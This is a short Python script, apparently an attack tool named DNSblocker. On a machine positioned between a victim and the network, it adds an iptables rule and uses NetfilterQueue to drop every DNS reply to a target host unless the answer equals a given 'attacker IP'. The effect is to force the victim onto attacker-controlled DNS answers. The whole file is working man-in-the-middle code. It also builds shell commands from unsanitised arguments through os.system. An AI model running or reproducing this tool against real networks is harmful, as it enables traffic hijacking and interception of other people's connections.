#!/usr/bin/python

"""

    - Prevent a particular host to reveal its real IP address

"""

import os
import sys
from scapy.all import *
from netfilterqueue import NetfilterQueue

def block(packet):
    pck = IP(packet.get_payload())

    if pck[DNS][DNSRR].rdata != sys.argv[3]:
        packet.drop()
    else:
        packet.accept()

def main():
    if len(sys.argv) == 4:
        os.system("iptables -I FORWARD -d %s -p udp --sport 53 -m string --string \"%s\" --algo bm -j NFQUEUE --queue-num 1" % (sys.argv[1], sys.argv[2]))

        nfqueue = NetfilterQueue()
        nfqueue.bind(1, block)

        try:
            nfqueue.run()
        except KeyboardInterrupt:
            nfqueue.unbind()
            os.system("iptables -D FORWARD -d %s -p udp --sport 53 -m string --string \"%s\" --algo bm -j NFQUEUE --queue-num 1" % (sys.argv[1], sys.argv[2]))
            print ""
    else:
        print "DNSblocker.py <target IP> <string to match> <attacker IP>"

main()
